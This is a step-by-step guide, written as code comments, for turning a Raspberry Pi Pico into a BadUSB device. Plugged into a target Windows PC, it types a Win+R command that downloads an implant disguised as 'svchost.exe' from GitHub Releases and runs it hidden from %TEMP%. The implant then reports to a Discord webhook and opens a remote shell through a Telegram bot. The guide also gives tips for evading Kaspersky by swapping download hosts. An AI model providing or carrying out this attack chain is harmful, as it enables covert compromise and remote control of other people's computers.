# BadUSB for Raspberry Pi Pico — Flash + Deploy Guide
#
# Turns a Pi Pico into "plug-and-pwn": emulates USB keyboard,
# runs Win+R → downloads svchost.exe from GitHub Releases → executes.

# === WHAT YOU NEED ===
# - Raspberry Pi Pico (your RP2 in UF2 mode)
# - USB cable
# - GitHub Release with svchost.exe (I'll create this)

# === STEP 1: Download CircuitPython ===
# https://downloads.circuitpython.org/bin/raspberry_pi_pico/en_US/adafruit-circuitpython-raspberry_pi_pico-en_US-latest.uf2

# === STEP 2: Flash CircuitPython ===
# 1. Hold BOOTSEL button while plugging in Pico
# 2. Release → "RPI-RP2" drive appears
# 3. Drag .uf2 onto RPI-RP2
# 4. Pico reboots as "CIRCUITPY"

# === STEP 3: Copy Payload Files ===
# 1. Drag code.py onto CIRCUITPY
# 2. Also drag lib/ folder (contains adafruit_hid)
# 3. UNPLUG IMMEDIATELY — code.py auto-runs on boot!

# === STEP 4: Create GitHub Release ===
# gh release create v1.0 dist/svchost.exe --title "Implant v3" --notes "Educational"

# === STEP 5: Deploy to Target ===
# 1. Plug Pico into target PC
# 2. Wait 4 seconds
# 3. svchost.exe is now running from %TEMP%
# 4. Discord webhook fires "ONLINE" ping
# 5. Telegram bot spawns for interactive shell

# === TECHNICAL ===
# - USB HID keyboard — no driver, no admin, no UAC
# - WindowStyle Hidden minimises the flash
# - TEMP folder is user-writable (no admin needed)
# - If Kaspersky blocks: switch to Discord CDN or fresh Gist URL

# === TEST ON YOUR LAPTOP FIRST ===
# 1. Flash + copy → unplug
# 2. Close important windows
# 3. Plug in 5 seconds
# 4. Check: ls $env:TEMP\svchost.exe
#    Check Discord webhook for ONLINE ping
